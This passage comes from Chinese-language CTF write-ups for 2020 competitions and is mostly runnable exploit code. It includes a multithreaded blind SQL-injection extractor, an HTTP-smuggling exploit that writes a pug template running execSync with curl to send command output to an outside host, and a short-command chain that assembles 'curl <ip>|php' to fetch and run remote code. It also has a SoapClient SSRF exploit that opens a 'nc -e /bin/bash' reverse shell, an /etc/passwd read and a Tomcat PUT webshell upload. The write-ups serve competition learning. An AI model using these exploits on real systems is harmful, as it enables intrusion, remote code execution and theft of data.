xx;/*\" # print(res) if pattern.match(res): print(\"match\") exit(0) return resdef exp(): # payload = \"select if((ascii(substr(reverse((select group_concat(table_name) from information_schema.tables where table_schema=database())),%d,1))>%d),0,sleep(4));\" payload = \"select if((ascii(substr(reverse((select fllllll4g from pdotest.table1)),%d,1))>%d),0,sleep(4));\" res = \"\" for i in range(1,60): start = 32 end = 128 mid = (end + start) // 2 while end > start: params = { \"id\": gen(payload, i, mid) } try: requests.get(url+\"?id=\"+params['id'], timeout=2) start = mid + 1 except: end = mid mid = (end + start) // 2 res = chr(mid) + res print(res) # print(f\"{i}: {res}\")if __name__ == \"__main__\": exp() 改进了一个多线程版本, 一分钟不到就可以注出结果 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import requestsfrom libnum import s2nimport stringimport refrom multiprocessing.pool import ThreadPoolurl = \"http://e0bac4dbfc61452b906f16cacbe31e9bfe43db0e990f4ace.changame.ichunqiu.com/\"pattern = re.compile(\"union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\\^|&|database\", re.I)res = [\"\" for i in range(60)]def gen(payload, pos, num): \"\"\" SET @SQL=0x73656c65637420646174616261736528293b;PREPARE pord FROM @SQL;EXECUTE pord;\"\"\" res = \"%bf%27;SET @x=\" + (hex(s2n(payload % (pos, num)))) + \";PREPARE xx FROM @x;EXECUTE xx;/*\" # print(res) if pattern.match(res): print(\"match\") exit(0) return resdef exp(i): # payload = \"select if((ascii(substr(reverse((select group_concat(table_name) from information_schema.tables where table_schema=database())),%d,1))>%d),0,sleep(4));\" payload = \"select if((ascii(substr(((select fllllll4g from pdotest.table1)),%d,1))>%d),0,sleep(4));\" # for i in range(1,60): if i: start = 32 end = 128 mid = (end + start) // 2 while end > start: params = { \"id\": gen(payload, i, mid) } try: requests.get(url+\"?id=\"+params['id'], timeout=2) start = mid + 1 except: end = mid mid = (end + start) // 2 res[i] = chr(mid) print(\"\".join(res)) # print(f\"{i}: {res}\")if __name__ == \"__main__\": pool = ThreadPool(5) for i in range(45): pool.apply_async(exp, (i, )) # exp() pool.close() pool.join() black_listhttps://skysec.top/2019/12/13/2019-FudanCTF-Writeup/ 飘零师傅 tql ezsqli这道题过滤了很多东西, 主要参考的是出题人的博客 https://www.smi1e.top/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/ 由于我们没有 union, 无法使用常规的无列名注入, 找了很多资料, 只有 smi1e 师傅的这个 payload 可用 1234567891011121314151617mysql> SELECT * FROM USERS WHERE ID =1;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | 123 | Dumb |+----+----------+----------+1 row in set (0.00 sec)mysql> SELECT * FROM USERS WHERE ID = ((select 1,123,'Dumb') SELECT * FROM USERS WHERE ID = ((select 2,123,'Dumb') { res.send(e.message); }); }); } catch (error) { console.log(error); } } } else { res.send(\"search param 'q' missing!\"); }});function blacklist(url) { var evilwords = [ \"global\", \"process\", \"mainModule\", \"require\", \"root\", \"child_process\", \"exec\", '\"', \"'\", \"!\" ]; var arrayLen = evilwords.length; for (var i = 0; i < arrayLen; i++) { const trigger = url.includes(evilwords[i]); if (trigger === true) { return true; } }}var server = app.listen(8081, function() { var host = server.address().address; var port = server.address().port; console.log(\"Example app listening at http://%s:%s\", host, port);}); 考点是 ssrf, 而这里利用的是 https://xz.aliyun.com/t/2894 在 nodejs8.12.0这个版本中, 程序在底层处理的时候会舍弃高位的字符, 只保留低位的字符, 也就是说 假如我们传入 1chr(0xffa0) 处理后会被截断为 1chr(0xa0) 那么我们就可以利用这个特点来进行编码绕过, 方法如下 12def exp_code(word): return quote(''.join(chr(int('0xff' + hex(ord(c))[2:].zfill(2), 16)) for c in word)) 其中的0xff可以随意设定, 不会影响结果 然后再利用 http 走私攻击, 向程序发送两个请求, 这里在构造数据包的时候需要将\\n替换为\\r\\n, 否则将无法识别为正常的请求包 1payload.replace(\"\\n\", \"\\r\\n\") 接着我们就可以构造请求类似这样 12345678910111213141516171819202122 HTTP/1.1Host: xConnection: keep-alivePOST /file_upload HTTP/1.1Host: xContent-Length: 193Origin: http://123.57.212.112:33322Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryL3EANY7czeEB7XdWConnection: keep-alive------WebKitFormBoundaryL3EANY7czeEB7XdWContent-Disposition: form-data; name=\"file\"; filename=\"cjm22n.pug\"Content-Type: text/javascriptbaaaaaa------WebKitFormBoundaryL3EANY7czeEB7XdW--GET /flag HTTP/1.1Host: xConnection: closex: 大概这样的请求来进行绕过, 再看程序上传的流程 文件目录在 1/upload/minetype/ 如果我们使得minetype为 1../template 就可以将文件写入模板目录中, 再通过 这里进行任意访问, 首先需要 rce, 我们可以通过 pug 模板的 1- global.process.mainModule.require('child_process').execSync('evalcmd') 来执行命令, 编写 exp 如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445import requestsfrom urllib.parse import quoteurl = \"http://182.92.243.154:33323/\"def upload(cmd): payload = ''' HTTP/1.1Host: xConnection: keep-alivePOST /file_upload HTTP/1.1Host: xContent-Length: 304Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBOpB7RbAKnIckY80Connection: keep-alive------WebKitFormBoundaryBOpB7RbAKnIckY80Content-Disposition: form-data; name=\"file\"; filename=\"cjm00n.pug\"Content-Type: ../template- global.process.mainModule.require('child_process').execSync('curl http://ip:port/ -X POST -d `evalcmd`')------WebKitFormBoundaryBOpB7RbAKnIckY80--GET /flag HTTP/1.1Host: xConnection: closex: ''' payload = payload.replace(\"\\n\", \"\\r\\n\").replace(\"evalcmd\", cmd).replace(\"304\", str(297 + len(cmd))) payload = ''.join(chr(int('0xee' + hex(ord(c))[2:].zfill(2), 16)) for c in payload) params = { \"q\": payload } requests.get(f\"{url}core\", params=params,) try: requests.get(f\"{url}?action=cjm00n\", timeout=2) except: print(\"done\") # print(res)def exp_code(word): return quote(''.join(chr(int('0xff' + hex(ord(c))[2:].zfill(2), 16)) for c in word))if __name__ == \"__main__\": upload(\"cat /flag.txt\") # print(exp_code(\"`\")) 使用的时候替换一下 ip 和 port, 以及重新计算一下Content-Length 本文作者: cjm00n本文地址: https://cjm00n.top/CTF/新春公益赛2020wp.html 版权声明: 除特别说明外，所有文章均采用 CC BY 4.0 许可协议，转载请先取得同意。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","link":"/CTF/%E6%96%B0%E6%98%A5%E5%85%AC%E7%9B%8A%E8%B5%9B2020wp.html"},{"title":"高校战疫分享赛Writeup","text":"给各位神仙递茶 更新中, 8/15 easy_trick_gzmtu想给出题人寄刀片.jpg 这道题有时间参数, 而且给的示例比较特别 这个点, 很长时间都没有理解, 直到后面队友@Sjoshua 来看, 一眼看出是 date 转义 https://www.php.net/manual/zh/function.date.php 测试的方法如下, 我们可以发现 1/?time=2019 是有数据的 今天的日期是2020.3.19 可以从手册中发现 那么我们输入 1/?time=201j 输出相同, 证明是 date 转义 那么我们要正常注入的话就应该转义回去, 这里@Sjoshua 直接写了个 tamper 脚本去跑, 十分强悍 123456789101112131415#!/usr/bin/env pythonfrom lib.core.enums import PRIORITY__priority__ = PRIORITY.NORMALdef dependencies(): passdef tamper(payload, **kwargs): return payload.replace('d', '\\\\d').replace('D', '\\\\D').replace('j', '\\\\j').replace('l', '\\\\l').replace('N', '\\\\N').replace('S', '\\\\S').replace('w', '\\\\w').replace('z', '\\\\z').replace('W', '\\\\W').replace('F', '\\\\F').replace('m', '\\\\m').replace('M', '\\\\M').replace('n', '\\\\n').replace('t', '\\\\t').replace('L', '\\\\L').replace('o', '\\\\o').replace('Y', '\\\\Y').replace('y', '\\\\y').replace('a', '\\\\a').replace('A', '\\\\A').replace('B', '\\\\B').replace('g', '\\\\g').replace('G', '\\\\G').replace('h', '\\\\h').replace('H', '\\\\H').replace('i', '\\\\i').replace('s', '\\\\s').replace('u', '\\\\u').replace('e', '\\\\e').replace('I', '\\\\I').replace('O', '\\\\O').replace('P', '\\\\P').replace('T', '\\\\T').replace('Z', '\\\\Z').replace('c', '\\\\c').replace('r', '\\\\r').replace('U', '\\\\U') 原理很粗暴, 就是转义回去 2333 然后爬数据 1sqlmap -u http://121.37.181.246:6333/index.php\\?time\\=2020 --tamper=escapedate -D trick --dump 获得 admin 信息 上去登录后, 可以读文件 试一下, 发现需要本地访问 上全套测试 1234Client-Ip:127.0.0.1X-Forwarded-For:127.0.0.1Host:127.0.0.1file://localhost/etc/passwd 那读什么文件呢, 看注释 读了之后是个简单的 trick 12345678910111213141516171819202122232425262728293031323334353637383940414243442){ $str = \"\"; $number = str_split($number,2); foreach ($number as $num ) { $str = $str .chr($num); } return strtolower($str); } return chr($number); } public function calc(){ $gf=$this->gf; if(!preg_match('/[a-zA-z0-9]|\\&|\\^|#|\\$|%/', $gf)){ eval('$content='.$gf.';'); $content = $this->aiisc_to_chr($content); return $content; } } public function __destruct(){ $this->content_to_file($this->calc()); }}unserialize((base64_decode($_GET['code'])));?> 两个正则, 绕过都很简单, 首先看 pass 的正则 12345678$passwd = $_GET['pass']; if(preg_match('/^[a-z]+\\.passwd$/m',$passwd)){ if(strpos($passwd,\"20200202\")){ echo file_get_contents(\"/\".$content); } 根据 p 神分享过的一个知识点, 这里的正则界定符是/m, 会把输入当成多行, 而这个$会匹配换行符, 那么我们只需要 1pass=cjm00n.passwd%0a20200202 即可绕过, 第二个如下 1234567public function calc(){ $gf=$this->gf; if(!preg_match('/[a-zA-z0-9]|\\&|\\^|#|\\$|%/', $gf)){ eval('$content='.$gf.';'); $content = $this->aiisc_to_chr($content); return $content; } 取反绕过, 写脚本 1234567891011121314151617181920212223 传参即可, 注意有些地方要 url 编码 hardphp待更新 webctwww.zip 发现源码 看一下源码主要有两个部分 首先是 mysql 的远程连接, 入口在testsql.php 123456789testquery(); db 类的定义是 123456789101112131415161718192021222324252627282930class Db{ public $ip; public $user; public $password; public $option; function __construct($ip,$user,$password,$option) { $this->user=$user; $this->ip=$ip; $this->password=$password; $this->option=$option; } function testquery() { $m = new mysqli($this->ip,$this->user,$this->password); if($m->connect_error){ die($m->connect_error); } $m->options($this->option,1); $result=$m->query('select 1;'); if($result->num_rows>0) { echo '测试完毕，数据库服务器处于开启状态'; } else{ echo '测试完毕,数据库服务器未开启'; } }} 很显然有任意远程连接, rogue mysql server没跑了 然后还有文件上传的部分, 入口 1234567891011deal();echo \"存储的图片:\".\"\";$ls = new Listfile('./uploads/'.md5($_SERVER['REMOTE_ADDR']));echo $ls->listdir().\"\";?> 定义在 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465class File{ public $uploadfile; function __construct($filename) { $this->uploadfile=$filename; } function xs() { echo '请求结束'; }}class Fileupload{ public $file; function __construct($file) { $this->file = $file; } function deal() { $extensionarr=array(\"gif\",\"jpeg\",\"jpg\",\"png\"); $extension = pathinfo($this->file->uploadfile['name'], PATHINFO_EXTENSION); $type = $this->file->uploadfile['type']; //echo \"type: \".$type; $filetypearr=array(\"image/jpeg\",\"image/png\",\"image/gif\"); if(in_array($extension,$extensionarr)&in_array($type,$filetypearr)&$this->file->uploadfile[\"size\"] 0) { echo \"错误：: \" .$this->file->uploadfile[\"error\"] . \"\"; die(); }else{ if(!is_dir(\"./uploads/\".md5($_SERVER['REMOTE_ADDR']).\"/\")){ mkdir(\"./uploads/\".md5($_SERVER['REMOTE_ADDR']).\"/\"); } $upload_dir=\"./uploads/\".md5($_SERVER['REMOTE_ADDR']).\"/\"; move_uploaded_file($this->file->uploadfile[\"tmp_name\"],$upload_dir.md5($this->file->uploadfile['name']).\".\".$extension); echo \"上传成功\".\"\"; } } else{ echo \"不被允许的文件类型\".\"\"; } } function __destruct() { $this->file->xs(); }}class Listfile{ public $file; function __construct($file) { $this->file=$file; } function listdir(){ system(\"ls \".$this->file).\"\"; } function __call($name, $arguments) { system(\"ls \".$this->file); }} 有危险函数 1234function __call($name, $arguments){ system(\"ls \".$this->file);} 而且有魔术方法 1234function __destruct(){ $this->file->xs();} 那么总结一下, 文件上传+反序列化 = phar, 而触发点呢, 很容易想到大师傅@zsx 的文章 https://blog.zsxsoft.com/post/38 oh 多么美妙, 一应俱全, 这里直接上队友@DiaosSama 的 exp 12345678910111213141516171819202122startBuffering();$phar->setStub(\"\");$o = new Fileupload();$o->file = new Listfile();$phar->setMetadata($o);$phar->addFromString(\"test.txt\", \"test\");$phar->stopBuffering(); 改文件名, 先上传到服务器, 获取路径 再用这个 https://github.com/allyshka/Rogue-MySql-Server/blob/master/rogue_mysql_server.py 读一下那个文件, 填上参数 webtmppython 的 pickle 反序列化 源码如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667import base64import ioimport sysimport picklefrom flask import Flask, Response, render_template, requestimport secretapp = Flask(__name__)class Animal: def __init__(self, name, category): self.name = name self.category = category def __repr__(self): return f'Animal(name={self.name!r}, category={self.category!r})' def __eq__(self, other): return type(other) is Animal and self.name == other.name and self.category == other.categoryclass RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module == '__main__': return getattr(sys.modules['__main__'], name) raise pickle.UnpicklingError(\"global '%s.%s' is forbidden\" % (module, name))def restricted_loads(s): return RestrictedUnpickler(io.BytesIO(s)).load()def read(filename, encoding='utf-8'): with open(filename, 'r', encoding=encoding) as fin: return fin.read()@app.route('/', methods=['GET', 'POST'])def index(): if request.args.get('source'): return Response(read(__file__), mimetype='text/plain') if request.method == 'POST': try: pickle_data = request.form.get('data') if b'R' in base64.b64decode(pickle_data): return 'No... I don\\'t like R-things. No Rabits, Rats, Roosters or RCEs.' else: result = restricted_loads(base64.b64decode(pickle_data)) if type(result) is not Animal: return 'Are you sure that is an animal???' correct = (result == Animal(secret.name, secret.category)) return render_template('unpickle_result.html', result=result, pickle_data=pickle_data, giveflag=correct) except Exception as e: print(repr(e)) return \"Something wrong\" sample_obj = Animal('一给我哩giaogiao', 'Giao') pickle_data = base64.b64encode(pickle.dumps(sample_obj)).decode() return render_template('unpickle_page.html', sample_obj=sample_obj, pickle_data=pickle_data)if __name__ == '__main__': app.run(host='0.0.0.0', port=5000) 主要参考 https://zhuanlan.zhihu.com/p/89132768 这篇文章分析的贼有意思, 我觉得就是出题人 23333, 我们来跟一下, 首先创建下面这个 test.py 123456789101112131415161718192021import pickleimport pickletoolsimport secretimport base64class Animal: def __init__(self, name, category): self.name = name self.category = category def __repr__(self): return f'Animal(name={self.name!r}, category={self.category!r})' def __eq__(self, other): return type(other) is Animal and self.name == other.name and self.category == other.categoryif __name__ == \"__main__\": a = Animal(\"rua\", \"www\") s = pickle.dumps(a) s = pickletools.optimize(s) pickletools.dis(s) 输出为 其中 s 为 1\\x80\\x03c__main__\\nAnimal\\n)\\x81}(X\\x04\\x00\\x00\\x00nameX\\x03\\x00\\x00\\x00ruaX\\x08\\x00\\x00\\x00categoryX\\x03\\x00\\x00\\x00wwwub. 首先是\\x80\\x03, 表示 pickle 反序列化字符串的开始, \\x80读入一个版本号为3 c表示global, 引入一个模块, 以\\n分隔, 即为__main__.Animal )表示创建一个空的元组 \\x81则是将栈顶弹出作为参数, 再弹出栈顶作为cls, 然后进行实例化, 因此这里实例化了一个__main__.Animal }创建了一个字典, (则是MARK, 也就是load_mark, 将当前栈作为一个 list 加入前序栈, 然后清空当前栈, 压进去的就是实例化对象和空字典 V参数表示读入一个字符串, 以\\n结尾 u参数则是pop_mark, 将当前栈内容压进数组arr, 然后将前序栈内容恢复 那么此时的栈为__main__.Animal, dict, 然后拿到栈顶的空 dict, 必须为空 dict, 并将arr的值两个一组读入 dict 作为 key 和 value b则是BUILD, 将当前栈顶弹出存入 state, 再将栈顶弹出存入 inst, 然后利用 state 更新 inst .是结束 那么分析完了, 我们这里就可以开始构造, 首先看限制条件 12if b'R' in base64.b64decode(pickle_data): return 'No... I don\\'t like R-things. No Rabits, Rats, Roosters or RCEs.' 不允许使用__reduce__来执行命令 1234def find_class(self, module, name): if module == '__main__': return getattr(sys.modules['__main__'], name) raise pickle.UnpicklingError(\"global '%s.%s' is forbidden\" % (module, name)) 只能引入__main__, 而获取 flag 的地方 12correct = (result == Animal(secret.name, secret.category)) return render_template('unpickle_result.html', result=result, pickle_data=pickle_data, giveflag=correct) 其实就是文章下面的部分, 我们自己构造一下, 首先生成一个正常的 payload 1\\x80\\x03c__main__\\nAnimal\\n)\\x81}(X\\x04\\x00\\x00\\x00nameX\\x03\\x00\\x00\\x00ruaX\\x08\\x00\\x00\\x00categoryX\\x03\\x00\\x00\\x00wwwub. 首先引入 secret 模块 1\\x80\\x03c__main__\\nsecret\\nc__main__\\nAnimal\\n)\\x81}(X\\x04\\x00\\x00\\x00nameX\\x03\\x00\\x00\\x00ruaX\\x08\\x00\\x00\\x00categoryX\\x03\\x00\\x00\\x00wwwub. 然后创建空 dict, 并执行 mark 1\\x80\\x03c__main__\\nsecret\\n}(c__main__\\nAnimal\\n)\\x81}(X\\x04\\x00\\x00\\x00nameX\\x03\\x00\\x00\\x00ruaX\\x08\\x00\\x00\\x00categoryX\\x03\\x00\\x00\\x00wwwub. 再接着添加参数 name 和 category 1\\x80\\x03c__main__\\nsecret\\n}(Vname\\nVrua\\nVcategory\\nVwww\\nc__main__\\nAnimal\\n)\\x81}(X\\x04\\x00\\x00\\x00nameX\\x03\\x00\\x00\\x00ruaX\\x08\\x00\\x00\\x00categoryX\\x03\\x00\\x00\\x00wwwub. 然后执行 ub, 0 弹出栈顶 1\\x80\\x03c__main__\\nsecret\\n}(Vname\\nVrua\\nVcategory\\nVwww\\nub0c__main__\\nAnimal\\n)\\x81}(X\\x04\\x00\\x00\\x00nameX\\x03\\x00\\x00\\x00ruaX\\x08\\x00\\x00\\x00categoryX\\x03\\x00\\x00\\x00wwwub. 最后执行结果如下 成功修改, 那么 base64 编码上传即可 hackme这个题其实很简单, 只是第一步一直傻了 23333 www.zip 下源码, 分析一下, 注意到有设置反序列化的类型 一般默认的是php_unserialize, 而这里php的话, 会以|作为键值对的分隔符, 但是这里还有一个问题 我们一开始会经过这个 12ini_set('session.serialize_handler', 'php');session_start(); 当你第二次访问的时候, 这一行便不起作用了, 所以反序列化会变回php_unserialize, 那么这就出现了一个 session 反序列化的漏洞, 具体的我们可以参考[LCTF2018]签到题 https://xz.aliyun.com/t/3336 所以我们生成如下的类 1234567891011\"cjm00n\", \"admin\"=>1);echo(\"|\".serialize(new Info())); 然后在注入点 提交后看一下MySign你就会变成 admin 了 但是看代码这里有个redirect, 不知道为啥没有生效, 直接访问 1/core/index.php 这个绕 filter 的部分其实已经出烂了, 但是当时一直没想到, 过半天了才想起我的博客上也有 payloadhhhh 具体我们可以参考 http://github.mrkaixin.computer/2020/02/27/BUUctf%E9%9B%B6%E5%91%A8%E7%9B%AE/ 和[Bytectf2019]boring_code是一样的 1compress.zlib://data:@baidu.com/baidu.com?,phpinfo(); 改一下 1compress.zlib://data:@127.0.0.1/baidu.com?,phpinfo(); 这样就可以注入 payload, 后面的话是一个 4 字节的命令执行, 其实是[hitcon2017]BabyFirst Revenge v2的原题, 拿过来打就可以了 参考 https://findneo.github.io/171110Bypass4CLimit/ 脚本如下, 主要每次打之前都要访问一下/core/clear.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120import requestsimport refrom time import sleepimport randomimport hashlibfrom urllib.parse import quote, unquoteurl = \"http://121.36.222.22:88/\"session = requests.Session()def login(): data = { \"name\": \"admin\", } session.post(f\"{url}login.php\", data=data) sign = { \"sign\": '|O:4:\"info\":2:{s:5:\"admin\";i:1;s:4:\"sign\";s:6:\"cjm00n\";}' } session.post(f\"{url}?page=upload\", data=sign)def get(name): res = session.get(f\"{url}core/sandbox/603ea5bad7b6bad63e7a821de16173b6/{name}\").text print(res)def clean(): res = session.get(f\"{url}core/clear.php\").text print(res)def attack(cmd): prefix = \"compress.zlib://data:@127.0.0.1/baidu.com?,%s\" payload = cmd data = { \"url\": prefix % quote(payload) } text = session.post(f\"{url}core/index.php\", data=data).text if len(text) > 42: print(cmd) print(text[42:])def exp(): login() clean() # attack(\"ls>b\") # 存放待下载文件的公网主机的IP shell_ip = 'your_ip' # 将shell_IP转换成十六进制 ip = '0x' + ''.join([str(hex(int(i))[2:].zfill(2)) for i in shell_ip.split('.')]) pos0 = random.choice('efgh') pos1 = random.choice('hkpq') pos2 = 'g' # 随意选择字符 payload = [ '>dir', # 创建名为 dir 的文件 '>%s\\>' % pos0, # 假设pos0选择 f , 创建名为 f> 的文件 '>%st-' % pos1, # 假设pos1选择 k , 创建名为 kt- 的文件,必须加个pos1， # 因为alphabetical序中t>s '>sl', # 创建名为 >sl 的文件；到此处有四个文件， # ls 的结果会是：dir f> kt- sl '*>v', # * 相当于 `ls` ，那么这条命令等价于 `dir f> kt- sl`>v ， # dir是不换行的，所以这时会创建文件 v 并写入 f> kt- sl # 非常奇妙，这里的文件名是 v ，只能是v ，没有可选字符 '>rev', # 创建名为 rev 的文件，这时当前目录下 ls 的结果是： dir f> kt- rev sl v '*v>%s' % pos2, # 魔法发生在这里： *v 相当于 rev v ，* 看作通配符。体会一下。 # 这时pos2文件，也就是 g 文件内容是文件v内容的反转： ls -tk > f # 续行分割 curl 0x11223344|php 并逆序写入 '>p', '>ph\\\\', '>\\|\\\\', '>%s\\\\' % ip[8:10], '>%s\\\\' % ip[6:8], '>%s\\\\' % ip[4:6], '>%s\\\\' % ip[2:4], '>%s\\\\' % ip[0:2], '>\\ \\\\', '>rl\\\\', '>cu\\\\', 'sh ' + pos2, # sh g ;g 的内容是 ls -tk > f ，那么就会把逆序的命令反转回来， # 虽然 f 的文件头部会有杂质，但不影响有效命令的执行 'sh ' + pos0, # sh f 执行curl命令，下载文件，写入木马。] print(payload) for i in payload: assert len(i) username\\n\"; } } $key = strval(mt_rand() & 0x5f5e0ff); $iv = strval(mt_rand() & 0x5f5e0ff); $mes = (serialize(new User(\"guest\"))); echo \"$mes\\n\"; $cipher = openssl_encrypt($mes, \"des-cbc\", $key, 0, $iv); echo \"$key, $iv, $cipher\\n\"; $iv = openssl_decrypt($cipher, \"des-cbc\", $key, 0, substr($mes,0,8)); echo $iv; echo \"\\ndone\\n\"; 输出为 可以看到红框中的两个部分是一样的, 但是我们如何获取KEY呢, 注意到页面中给了这些信息 其中特别给出了用户数, 而 Uid 我们可以跟一下, 在源码中 12345if(!isset($_SESSION['key'])){ $_SESSION['key'] = strval(mt_rand() & 0x5f5e0ff); $_SESSION['iv'] = $IV;}$username = \"guest\"; 其中$KEY是每个用户都会生成一次, 应该就是 UID, 也符合上面说的 1we give every user an special key like yours 而这个mt_rand()很快可以联想到之前安全客上面的一篇文章 无需暴破还原 mt_rand()种子 可以看文章中给出的代码需要的参数如下 1main(_R000, _R227, offset, flavour) 各参数分别为 相隔 226 个数的 R0, R227 生成 R0 之前已经生成的个数 offset flavour 如果是 php7 则为 1, php5 则为 0 而这几个参数我们都是已知的, 就可以通过 github 的脚本顺利求出 seed, 进而得到当前用户的key, 那么iv就可知了, 构造脚本如下 首先获取登录中得到的信息 123456789101112131415161718import requestsimport reimport subprocessfrom urllib.parse import quote, unquoteimport sysurl = \"http://192.168.2.106:2333/\"session = requests.Session()def getInfo(): print(\"[func] getInfo\") res = session.get(url) cookie_user = res.cookies['user'] uid_first, _, uid_last = re.findall(\"\\d{4,}\",res.text) print(f\"[*] {uid_first}\") print(f\"[*] {uid_last}\") print(f\"[*] {cookie_user}\") return uid_first, uid_last, cookie_user 然后通过这些参数调用 php 计算 key 和 iv 123def getExp(uid_first, uid_last, cookie_user, cmd, target): print(\"[func] getExp\") res = subprocess.check_output(['php', \"first.php\", uid_first, uid_last, cookie_user]).decode(\"utf-8\") 计算的部分如下 123456789101112131415161718192021222324252627282930username = $username; } function show(){ return \"username: $this->username\\n\"; } } $o = new User(\"guest\"); $mes = serialize($o); $c = $argv[3]??\"OS8vWDE4Mk5ETklJYytXTUFLZG5xU2hJeFkyQ2tXbTJEb01wWkhRUThkckpYcnFDR2RpalFhb3dDekRTem82RQ%3D%3D\"; $cipher = base64_decode(urldecode($c)); mt_srand(intval($seed)); for($i = 0; $i < 228; $i++){ mt_rand(); } $key = strval(mt_rand() & 0x5f5e0ff); echo \"key: $key\\n\"; $iv = substr(openssl_decrypt($cipher, \"des-cbc\", $key, 0, substr($mes, 0, 8)),0,8); echo \"iv: $iv\\n\"; 然后我们就可以进行反序列化了, 先登录为admin 123456789101112131415161718// calc iv class User{ public $username; function __construct($username) { $this->username = $username; } function show(){ return \"username: $this->username\\n\"; } }$o = new User(\"admin\");$aaa = serialize($o);$cipher = openssl_encrypt($aaa, \"des-cbc\", $key, 0, $iv);$cookie_user = base64_encode($cipher);$cookie_hash = md5($aaa);echo \"user: $cookie_user\\n\";echo \"hash: $cookie_hash\\n\"; 完整的 exp 可以看后面的部分 成功登录admin之后, 就会看到下一关的源码和位置 非预期De1ta 的师傅直接爆破了 iv 23333, 由于这里的 iv 是写死的, 所以可以直接爆破, 只需要 10^8 次方即可, 不是很大, 另外还有师傅直接把 session 赋空, 这样 iv 就为空了 2333, 思路十分灵活 Second12I left a shell in 10.10.1.12/index.phptry to get it! hint.php 中直接给出了位置, 而右键就可以看到注释的源代码, 这里主要是一个小 Trick 12345678show(); 这里就能触发 SSRF 了, 参考 l3m0n 师傅的 poc 改一下 12345$cmd = urlencode(\"`\\$cc`;bash -c 'payload'\");$path = \"http://10.10.1.12/\";$path = $path.\"?cc=$cmd\";$o = new SoapClient(null, array('uri' => $path, 'location' => $path));$aaa = serialize($o); 试一下就会发现服务器上面装了 nc, 直接nc -e即可, 结合第一关的解密脚本, 写出比较完整的 exp 123456789101112131415161718192021222324252627282930313233343536373839404142username = $username; } function show(){ return \"username: $this->username\\n\"; } } $o = new User(\"guest\"); $mes = serialize($o); $c = $argv[3]??\"OS8vWDE4Mk5ETklJYytXTUFLZG5xU2hJeFkyQ2tXbTJEb01wWkhRUThkckpYcnFDR2RpalFhb3dDekRTem82RQ%3D%3D\"; $cipher = base64_decode(urldecode($c)); mt_srand(intval($seed)); for($i = 0; $i < 228; $i++){ mt_rand(); } $key = strval(mt_rand() & 0x5f5e0ff); echo \"key: $key\\n\"; $iv = substr(openssl_decrypt($cipher, \"des-cbc\", $key, 0, substr($mes, 0, 8)),0,8); echo \"iv: $iv\\n\"; // generate exp $cmd = $argv[4] ?? urlencode(\"`\\$cc`;bash -c 'nc ip port -t -e /bin/bash'\"); $path = $argv[5] ?? \"http://10.10.1.12/\"; $path = $path.\"?cc=$cmd\"; $o = new SoapClient(null, array('uri' => $path, 'location' => $path)); $aaa = serialize($o); $cipher = openssl_encrypt($aaa, \"des-cbc\", $key, 0, $iv); $cookie_user = base64_encode($cipher); $cookie_hash = md5($aaa); echo \"user: $cookie_user\\n\"; echo \"hash: $cookie_hash\\n\"; 然后是自动上传的脚本 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556import requestsimport reimport subprocessfrom urllib.parse import quote, unquoteimport sysurl = \"http://192.168.2.106:2333/\"session = requests.Session()def getInfo(): print(\"[func] getInfo\") res = session.get(url) cookie_user = res.cookies['user'] uid_first, _, uid_last = re.findall(\"\\d{4,}\",res.text) print(f\"[*] {uid_first}\") print(f\"[*] {uid_last}\") print(f\"[*] {cookie_user}\") return uid_first, uid_last, cookie_userdef getExp(uid_first, uid_last, cookie_user, cmd, target): print(\"[func] getExp\") res = subprocess.check_output(['php', \"first.php\", uid_first, uid_last, cookie_user, cmd, target]).decode(\"utf-8\") # print(f\"[*] {res}\") user = re.findall(\"user:.+hash\", res, re.S)[0].replace(\"user: \", \"\").replace(\"hash\", \"\").strip() userhash = re.findall(\"hash: .+\", res, re.S)[0].replace(\"hash: \", \"\").strip() print(f\"[*] {user}\") print(f\"[*] {userhash}\") return user, userhashdef attack(): print(\"[func] attack\") if len(sys.argv) > 1: cmd = sys.argv[1] else: cmd = \"bash -c 'nc ip port -t -e /bin/bash'\" print(f\"[*] cmd: {cmd}\") cmd = \"`$cc`;\" + cmd # cmd = \"abc\" target = \"http://10.10.1.12/\" uid_first, uid_last, cookie_user = getInfo() user, userhash = getExp(uid_first, uid_last, cookie_user, quote(cmd), target) try: cookies = { 'user': user, 'hash': userhash } session.cookies.update(cookies) res = session.get(url, timeout=3).text print(\"[.] attack maybe not success...\") except requests.exceptions.ReadTimeout: print(\"[.] attack success!\") except Exception as error: print(error)if __name__ == \"__main__\": attack() VPS 上面监听 1nc -lvvp 2333 运行 exp.py, 就可以反弹 shell, 然后在/下找到hint Lasthttps://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2017-12615 这个洞还是太古老了 hhh 看到版本搜一下应该蛮明显的 找个 jsp 马 123456789101112 然后上传 1curl -X PUT http://10.10.2.13:8080/2.jsp/ -d \"`echo 